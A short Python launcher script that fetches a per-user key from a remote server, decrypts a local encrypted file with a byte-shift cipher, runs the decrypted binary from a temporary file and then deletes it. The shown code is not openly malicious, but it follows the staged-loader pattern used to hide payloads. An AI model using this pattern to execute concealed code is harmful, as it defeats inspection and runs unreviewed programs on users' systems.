import subprocess
import os
import base64
import base45
import tempfile
import requests

HOST_URL="" #setup the host url here
FILE_NAME="" #setup the filename here
def progress_bar(progress,total):
    p=100*progress/total
    b='█'*int(p)+'-'*int(100-p)
    print(f'\r|{b}| {p:.2f}%',end="\r")

def read_key():
    user=open("data/profile/user.dat",'rb').read()
    uid=base64.b64decode(base45.b45decode(str(user,'utf-8')).decode()).decode()
    try:
        return requests.get(f"{HOST_URL}/{uid}").json()['key']
    except requests.exceptions.ConnectionError:
        print("Connection Error!")
        exit()


def decrypt_file(filename,key):
    file=open(filename,"rb")
    filedata=bytearray(file.read())
    key=bytes(key,'utf-8')
    decrypted_data=bytearray()
    l=len(filedata)
    for i in range(l):
        decrypted_data.append((filedata[i]-key[i%len(key)])%256)
        if i%5000==0 or i==l-1:
            progress_bar(i+1,l)
    file.close()
    file=tempfile.NamedTemporaryFile(delete=False)
    file.write(decrypted_data)
    file.close()
    return file.name


file=decrypt_file(f"data/{FILE_NAME}.dat",read_key())
subprocess.run(file)
os.remove(file)
